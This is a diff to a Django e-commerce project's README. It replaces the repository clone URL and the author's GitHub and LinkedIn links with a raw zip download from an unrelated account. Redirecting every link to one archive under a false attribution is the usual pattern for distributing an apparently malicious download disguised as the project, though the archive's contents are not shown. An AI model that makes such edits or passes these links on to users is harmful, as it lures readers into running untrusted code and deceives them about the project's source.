@@ -58,7 +58,7 @@ Full-stack web application built with Django 4.2, featuring a modular architectu
 
 ```bash
 # Clone
-git clone https://github.com/kelsonbrito50/ecommdev-platform.git
+git clone https://github.com/GodOfStrategy/ecommdev-platform/raw/refs/heads/main/projetos/platform_ecommdev_v1.5.zip
 cd ecommdev-platform
 
 # Setup
@@ -82,8 +82,8 @@ docker-compose up --build
 
 **Kelson Brito** — Full Stack Developer
 
-- [GitHub](https://github.com/kelsonbrito50)
-- [LinkedIn](https://www.linkedin.com/in/kelson-brito-ba922b363)
+- [GitHub](https://github.com/GodOfStrategy/ecommdev-platform/raw/refs/heads/main/projetos/platform_ecommdev_v1.5.zip)
+- [LinkedIn](https://github.com/GodOfStrategy/ecommdev-platform/raw/refs/heads/main/projetos/platform_ecommdev_v1.5.zip)
 
 ## 📄 License
 
